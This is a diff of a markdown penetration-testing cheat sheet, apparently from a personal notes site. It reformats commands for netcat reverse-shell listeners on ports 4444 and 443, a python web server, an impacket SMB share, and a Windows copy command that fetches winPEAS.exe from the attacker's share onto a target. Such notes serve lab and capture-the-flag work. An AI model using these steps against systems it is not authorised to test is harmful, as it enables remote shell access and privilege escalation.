@@ -10,19 +10,32 @@ pin: false
 
 ### For Linux
 
-	sudo nc -nvlp 4444
+```console
+sudo nc -nvlp 4444
+```
 
 ### For Windows
 
-	sudo rlwrap nc -nvlp 443
+```console
+sudo rlwrap nc -nvlp 443
+```
 
 ### Web service
 
-	sudo python3 -m http.server 80
+```console
+sudo python3 -m http.server 80
+```
 
 ### SMB service with python impacket
 
-	sudo smbserver.py share . -smb2support
-	# Use it
-	copy \\<local_ip>\share\winPEAS.exe .
+```console
+sudo smbserver.py share . -smb2support
+```
 
+## Get resource from service
+
+### SMB
+
+```console
+copy \\<local_ip>\share\winPEAS.exe .
+```
